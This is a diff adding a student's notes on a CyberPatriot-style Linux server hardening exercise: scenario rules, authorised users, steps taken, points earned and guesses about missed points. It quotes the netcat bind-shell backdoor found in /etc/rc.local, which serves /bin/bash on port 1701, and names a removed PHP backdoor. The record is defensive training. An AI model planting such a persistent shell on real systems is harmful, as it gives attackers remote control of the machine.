@@ -1,0 +1,181 @@
+** system usage / README ** 
+
+web server, authorised users only
+all accounts must be password protected
+no media / hacking tools
+no centralised maintenance or polling tools
+
+DEFAULT browser is LATEST STABLE firefox
+never let users log in as root, must use sudo
+
+all users MUST be able to log in via ssh
+SSHd is CRITICAL (penalty)
+
+web server uses PHPBB v3
+Apache, MySQL, PHP
+
+LATEST STABLE ubuntu packages for Apache, MySQL, PHP, PHPBB
+
+Apache and MySQL MUST BE RUNNING
+PHPBB forum is localhost, ACP at localhost/adm/index.php
+
+MySQL root pwd: 'CyberPatriot!'
+
+- AUTHORIZED ADMINS:
+JeanLuc Picard
+Geordi Laforge
+Tasha Yar
+Reginald Barclay
+Data
+
+- AUTHORIZED USERS:
+William Riker
+Deanna Troi
+Beverly Crusher
+Miles OBrien
+Ro Lauren
+Alynna Nechayev
+Tess Allenby
+Rachel Garrett
+Janet Brooks
+Leka Trion
+Jenna DSora
+Amanda Rogers
+Toby Russell
+Wesley Crusher
+Worf
+Guinan
+
+DEFAULT PASSWORD: 'CyberPatriot!'
+
+Do NOT remove any authorized users or their home directories
+
+** actions taken during competition **
+
+*interesting things*:
+
+packages:
+	- tcpd (removed)
+	- samba (removed) (point given: 'removed smb')
+	- winbind (removed)
+	- postfix
+	- oneconf
+
+removed user 'q'
+removed user 'gowron'
+removed user 'sonyagomez'
+removed user 'katherinepulaski'
+ -- (user removals each give points)
+
+removed %admin entry from sudoers
+
+SSHd PermitRootLogin no (given point: `SSH root login has been disabled`)
+
+mv /etc/apt/sources.list.save > /etc/apt/sources.list (sources.list lacked security repository entry)
+
+during apt-get dist-upgrade, unearthed points:
+	- MySQL remote access is disabled
+
+apt-get dist-upgrade gives points:
+	- PHP has been updated
+	- MySQL has been updated (upgrade reset configuration, point given: 'mysql remote access disabled')
+	- Linux kernel has been updated
+	- Apache has been updated
+
+set system to check for updates daily (gave point: 'system checks for updates daily')
+
+found link /var/www/install-KTRNekjemR -> /usr/share/phpbb3/install (unlinked)
+
+changed permissions on /var/www/config.php (PHPlogBB config) to 660 (point given: 'bad permissions fixed')
+
+changed password for ALL users to '1qazZAQ!1qazZAQ!'
+
+changed ownership (recursively) of /var/www to www-data:www-data
+
+removed /var/www/cmd.php (php backdoor) (given point: 'php backdoor removed')
+
+forensic question: 'where is the php backdoor?' answer: /var/www/cmd.php (point given)
+
+removed (purged) tightvncserver (point given)
+
+found nc backdoor, launched with '/etc/rc.local', line was `sh -c 'while true ; do nc -l -e /bin/bash -p 1701 ; done' &` (point given: nc backdoor removed)
+
+removed telnetd
+removed samba (given point: 'removed samba' {marked in *interesting things*})
+removed tcpd (downstream-deps: openbsd-inetd) (point given: 'inetd server disabled')
+
+modified groups (adm, lpadmin, sudo, sambashare) to include only: jeanlucpicard, geordilaforge, tashayar, reginaldbarclay, data =>
+	(given points: no longer administrator: milesobrien, wesleycrusher, worf)
+
+
+modified lightdm (window manager) settings (/etc/lightdm/lightdm.conf):
+	- allow-guest=false
+	- removed autologin-user setting (point given: automatic login disabled)
+
+removed /etc/sudoers.d/all (shortcut rule to give all users root) (point given: 'insecure sudo configuration fixed')
+
+removed `saned` user (had non-existent home directory)
+
+changed mysql password for user 'phpbb3'@'localhost'
+
+removed dnsmasq-base package (running as dns server)
+removed postfix package
+removed postgresql-9.1 (server)
+removed nfs-common, nfs-kernel-server (point given: 'disabled nfs server')
+removed netcat-openbsd, netcat-traditional
+
+installed clamav
+
+removed avahi-daemon, avahi-autoipd
+removed deja-dup
+
+removed mysql wildcard root user 'root'@'%'
+
+
+** post-scoring / post-action point breakdown **
+
+Account Policy - 8:
+	- user removals
+		+ q
+		+ gowron
+		+ sonyagomez
+		+ katherinepulaski
+	- account downgrade from admin
+		+ milesobrien
+		+ wesleycrusher
+		+ worf
+
+Software Updates - 5: (complete)
+	- updates from apt repositories
+		+ php
+		+ linux kernel
+		+ apache
+		+ mysql
+	- system update checks (checks for updates daily)
+
+Unnecessary Services - 4: (complete)
+	- VNC server has been disable
+	- Samba / SMB server has been disabled
+	- openbsd-inetd server has been disabled
+	- NFS server has been disabled
+
+Access Control - 4: (complete)
+	- SSH root login has been disabled
+	- Insecure sudo configuration fixed
+	- Bad permissions on config.php fixed
+	- MySQL remote access is disabled
+	
+Malware - 3:
+	- Netcat backdoor removed
+	- PHP backdoor removed
+	
+Advanced Linux Security Settings - 1: (complete)
+	- Automatic login (light-dm) is disabled // X - could be considered access control, autologin-user=jeanlucpicard must be removed from /etc/lightdm/lightdm.conf
+
+Digital Forensics - 1: (complete)
+	- Forensic question ("forensic question: 'where is the php backdoor?'") answered correctly (/var/www/cmd.php)
+
+
+** post-analysis notes **
+
+After analysing the points I got, it looks like the last two points in the competition would have to be in account policy and malware.  these last two must have been fairly hidden as well, as the standard procedures that I use did not take care of them as I expected.  I somewhat expect the final piece of malware to be a hidden copy of `john the ripper` or some other hacking tool, as I filtered through the package lists multiple times without finding anything that seemed to be malicious.  I also half-expect the final account policy point to be a problem with password expiration, maybe even pam configuration, although, after changing (and breaking) the pam configuration, I still hadn't obtained any points.
